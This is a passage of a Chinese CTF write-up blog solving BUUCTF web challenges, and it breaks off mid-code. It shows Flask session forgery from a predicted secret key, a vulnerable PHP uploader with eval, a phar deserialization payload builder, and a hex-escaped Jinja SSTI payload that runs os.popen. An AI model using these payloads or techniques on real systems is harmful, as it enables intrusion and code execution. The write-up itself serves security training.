</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;www-data&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;Hello World! &lt;a href=&#34;/read?url=https://baidu.com&#34;&gt;Read somethings&lt;/a&gt;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/read&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;^file.*&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">m</span> <span class="ow">or</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;No Hack&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;no response&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;fuck&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Access denied&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°è¦è®¿é—®flagè·¯ç”±ï¼Œè€Œä¸”sessioné‡Œé¢çš„usernameè¦ä¸ºfuck</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250428191150961.png"
	width="1594"
	height="613"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250428191150961_hu16669710697479349388.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250428191150961_hu6630844668066741797.png 1024w"
	loading="lazy"
	
		alt="image-20250428191150961"
	
	
		class="gallery-image" 
		data-flex-grow="260"
		data-flex-basis="624px"
	
></p>
<p>usernameé‚£ä¸ªå­—æ®µæ˜¯base64ç¼–ç åçš„www-data</p>
<p>è¦çŸ¥é“secret-keyå°±èƒ½ä¼ªé€ äº†</p>
<p>ä¼ªé€ sessioné¦–å…ˆè¦æ‹¿åˆ°secret_keyï¼Œçœ‹ä¸€ä¸‹secret_keyçš„ç”Ÿæˆæ–¹å¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">random.seed(uuid.getnode()) //ç§å­æ˜¯uuid.getnode(),å³æœºå™¨çš„å›ºå®šæ ‡è¯†ç¬¦ï¼Œæ ¹æ®macåœ°å€è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°
</span></span><span class="line"><span class="cl">app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233) //è¿™é‡Œæœ‰äº†ç§å­å°±å¯ä»¥è‡ªå·±ç”Ÿæˆsecret_key
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¯»å–/sys/class/net/eth0/addressè·å–macåœ°å€</p>
<p>4e:46:44:62:43:f0</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mh">0x4e46446243f0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="mf">12.498945071696037</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åflask-sessionä¼ªé€ </p>
<p>è¿™é‡Œæ˜¯py2ç¯å¢ƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python flask_session_cookie_manager2.py encode -s 12.498945071696037 -t &#34;{&#39;username&#39;:b&#39;fuck&#39;}&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gxyctf2019babysqliv30">[GXYCTF2019]BabysqliV3.0
</h2><p>å¼±å£ä»¤admin/password</p>
<p>è¿›å»ä¼ªåè®®è¯»æºç </p>
<p>upload.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Uploader</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$Filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$sandbox</span> <span class="o">=</span> <span class="nx">getcwd</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;/uploads/&#34;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&#34;.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span> <span class="o">=</span> <span class="nv">$sandbox</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">upload</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="k">global</span> <span class="nv">$sandbox</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">global</span> <span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;[^a-z0-9]&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;die(&#39;illegal filename!&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;die(&#39;you are too big (â€²â–½`ã€ƒ)&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;move_uploaded_file(&#39;&#34;</span><span class="o">.</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&#39;, &#39;&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span> <span class="o">.</span> <span class="s2">&#34;&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="k">global</span> <span class="nv">$sandbox</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">global</span> <span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// return $sandbox.$this-&gt;Filename.$ext;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">!=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;die(&#39;check token falied!&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$uploader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uploader</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$uploader</span><span class="o">-&gt;</span><span class="na">upload</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$uploader</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="s2">&#34;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$uploader</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$uploader</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>pharååºåˆ—åŒ–</p>
<p>éé¢„æœŸï¼Œfilenameå¯æ§ï¼Œç›´æ¥ä¼ å‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">file</span><span class="o">=</span><span class="n">upload</span><span class="o">&amp;</span><span class="n">name</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°flag</p>
<p>åŸæ¥è¿˜æœ‰ä¸€ä¸ªç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„éé¢„æœŸä¼°è®¡ç»™ä¿®äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">!=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;die(&#39;check token falied!&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>tokenå¯ä»¥é€šè¿‡éšä¾¿ä¸Šä¼ æ–‡ä»¶æ¥è·å–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Uploader</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$upload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uploader</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;highlight_file(&#39;/var/www/html/flag.php&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">Filename</span> <span class="o">=</span> <span class="s1">&#39;test&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">=</span> <span class="s1">&#39;GXY063c630ae7ab41c6fd121cb4851620a3&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;exp.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;GIF89a&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$upload</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;exp.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pasecactf_2019flask_ssti">[pasecactf_2019]flask_ssti
</h2><p>ç®€å•çš„ssti</p>
<p>è¿‡æ»¤ä¸‹åˆ’çº¿å’Œå•å¼•å·ï¼Œ16è¿›åˆ¶ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{config[&#34;\x5f\x5fclass\x5f\x5f&#34;][&#34;\x5f\x5finit\x5f\x5f&#34;][&#34;\x5f\x5fglobals\x5f\x5f&#34;][&#34;os&#34;][&#34;popen&#34;](&#34;whoami&#34;)[&#34;read&#34;]()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>flagä¸åœ¨ç›®å½•</p>
<p>è¯»configçœ‹åˆ°åŠ å¯†åçš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def encode(line, key, key2):
</span></span><span class="line"><span class="cl">    return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app.config[&#39;flag&#39;] = encode(&#39;&#39;, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±äºæ˜¯å¼‚æˆ–å†è¿è¡Œä¸€éå°±è¡Œäº†</p>
<p>æˆ–è€…è¯»proc/self/fd/3</p>
<p>å› ä¸ºfdç›®å½•å¯ä»¥è¯»åˆ°è¢«åˆ çš„çš„æ–‡ä»¶å†…å®¹</p>
<p>ä½†æ˜¯ä¸Šé¢ç›´æ¥è¯»æ˜¯æ²¡æœ‰çš„</p>
<p>å› ä¸ºselfæŒ‡å‘å‰é¢çš„popenï¼Œpopenè·Ÿflagæ“ä½œæ— å…³</p>
<p>æˆ‘ä»¬å…ˆè¯»psè¿›ç¨‹ï¼Œè¯»åˆ°pidä¸º1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /proc/1/fd/3
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="eis-2019ezpop">[EIS 2019]EzPOP
</h2><p>æ„é€ popé“¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$store</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$expire</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$store</span><span class="p">,</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$expire</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="o">=</span><span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expire</span><span class="o">=</span><span class="nv">$expire</span><span class="p">;</span>
